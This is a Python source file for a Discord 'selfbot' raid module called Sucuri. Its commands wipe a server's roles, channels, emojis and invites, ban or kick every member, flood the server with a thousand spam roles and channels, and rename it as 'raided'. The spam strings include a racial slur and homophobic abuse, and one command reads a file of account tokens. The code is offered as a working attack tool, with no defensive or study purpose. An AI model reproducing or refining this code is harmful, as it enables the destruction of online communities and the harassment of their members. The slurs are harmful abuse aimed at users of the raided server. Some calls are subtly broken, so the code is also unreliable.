import asyncio, threading
from discord.ext import commands
from random import randint, choice

messages = [
    'RAIDED WITH SUCURI',
    'SUCURI SELFBOT ON TOP',
    'SUCURI <3',
    'YOU SUCK DICK',
    'GET RAIDED LMFAO',
    'SUCURI BEST SELFBOT',
    'NICE SERVER LMFAO',
    'AIDS PROTECTION XD',
    'https://github.com/Nexuzzzzz/Sucuri',
    'GET REKT LMAO',
    'SUCURI BEST SELFBOT <3',
    'SUCURI SELFBOT BY NEXUS',
    'SUCURI OWNS YOU',
    'OH NIGGA YOU GAYY'
]

async def roles(ctx):

    guild = ctx.guild

    for role in guild.roles: # Remove roles
        try:
            role.delete()
        except:
            pass

    for _ in range(1000): # Create roles
        try:
            await guild.create_role(name=choice(messages))
        except:
            pass

async def channels(ctx):

    guild = ctx.message.guild

    for chan in guild.channels: # Channel remover
        try:
            chan.delete()
        except:
            pass

    for _ in range(1000):
        try:
            await guild.create_text_channel(choice(messages).replace(' ', '-')) # Channel creator
        except:
            pass

async def memberban(ctx):

    for memb in ctx.message.guild.members:
        try:
            await memb.ban(reason=choice(messages))
        except:
            pass

async def memberkick(ctx):

    for memb in ctx.message.guild.members:
        try:
            await memb.kick(reason=choice(messages))
        except:
            pass

async def emojis(ctx):

    for emoj in ctx.message.guild.emojis:
        try:
            await emoj.delete()
        except:
            pass

async def invites(ctx):

    invites = await ctx.message.guild.invites()
    for inv in invites:
        try:
            await inv.delete()
        except:
            pass

class raid_cog(commands.Cog):
    def __init__(self, client):
        self.client = client
    
    @commands.command(name='nuke')
    async def nukecmd(self, ctx):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            threading.Thread(target=roles, args=(ctx,), daemon=True).start() # Roles
            threading.Thread(target=channels, args=(ctx,), daemon=True).start() # Channels
            threading.Thread(target=memberban, args=(ctx,), daemon=True).start() # Ban members
            threading.Thread(target=emojis, args=(ctx,), daemon=True).start() # Emojis
            threading.Thread(target=invites, args=(ctx,), daemon=True).start() # Invites

            with open(r'images\raid.jpg', 'rb') as pic:
                logo = pic.read()

            await ctx.message.guild.edit(name='RAIDED WITH SUCURI')
            await ctx.message.guild.edit(icon=logo)
        else:
            pass
    
    @commands.command(name='kickall')
    async def kickallcmd(self, ctx):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            await memberkick(ctx)
        else:
            pass
    
    @commands.command(name='banall')
    async def banallcmd(self, ctx):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            await memberban(ctx)
        else:
            pass
    
    @commands.command(name='delroles')
    async def delrolescmd(self, ctx):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            await roles(ctx)
        else:
            pass
    
    @commands.command(name='delchannels')
    async def delchannelscmd(self, ctx):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            await channels(ctx)
        else:
            pass
    
    @commands.command(name='delemojis')
    async def delemojiscmd(self, ctx):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            await emojis(ctx)
        else:
            pass
    
    @commands.command(name='delinvites')
    async def delinvitescmd(self, ctx):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            await invites(ctx)
        else:
            pass
    
    @commands.command(name='join')
    async def joincmd(self, ctx):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            with open('tokens.txt', 'r') as tokens:
                for token in tokens.readlines():
                    token.strip()
        else:
            pass

def setup(bot):
    bot.add_cog(raid_cog(bot))